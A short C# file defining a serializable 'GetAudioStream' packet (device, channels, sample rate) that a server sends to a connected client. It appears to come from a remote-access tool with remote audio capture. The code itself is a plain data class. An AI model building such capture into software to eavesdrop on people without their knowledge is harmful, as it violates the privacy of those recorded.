using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets {

    [Serializable]
    public class GetAudioStream : IPacket {

        public int Device { get; set; }
        public int Channels { get; set; }
        public int SampleRate { get; set; }

        public GetAudioStream() {
            
        }

        public GetAudioStream(int device, int channels, int sampleRate) {
            Device = device;
            Channels = channels;
            SampleRate = sampleRate;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
